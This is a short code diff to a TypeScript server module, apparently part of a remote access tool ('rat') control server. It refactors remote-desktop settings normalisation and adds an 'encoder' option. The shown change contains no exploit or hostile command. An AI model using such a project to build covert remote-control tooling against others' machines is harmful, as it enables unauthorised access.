@@ -4,12 +4,13 @@ import { registry, RegistryError } from '$lib/server/rat/store';
 import { remoteDesktopManager, RemoteDesktopError } from '$lib/server/rat/remote-desktop';
 import type {
 	RemoteDesktopSessionResponse,
-	RemoteDesktopSettings
+	RemoteDesktopSettings,
+	RemoteDesktopSettingsPatch
 } from '$lib/types/remote-desktop';
 import type { RemoteDesktopCommandPayload } from '$lib/types/remote-desktop';
 
-function normalizeSettings(input: Record<string, unknown>): Partial<RemoteDesktopSettings> {
-	const output: Partial<RemoteDesktopSettings> = {};
+function normalizeSettings(input: Record<string, unknown>): RemoteDesktopSettingsPatch {
+	const output: RemoteDesktopSettingsPatch = {};
 	if (typeof input.quality === 'string') {
 		output.quality = input.quality as RemoteDesktopSettings['quality'];
 	}
@@ -24,6 +25,9 @@ function normalizeSettings(input: Record<string, unknown>): Partial<RemoteDeskto
 	}
 	if (typeof input.keyboard === 'boolean') {
 		output.keyboard = input.keyboard;
+	}
+	if (typeof input.encoder === 'string') {
+		output.encoder = input.encoder as RemoteDesktopSettings['encoder'];
 	}
 	return output;
 }
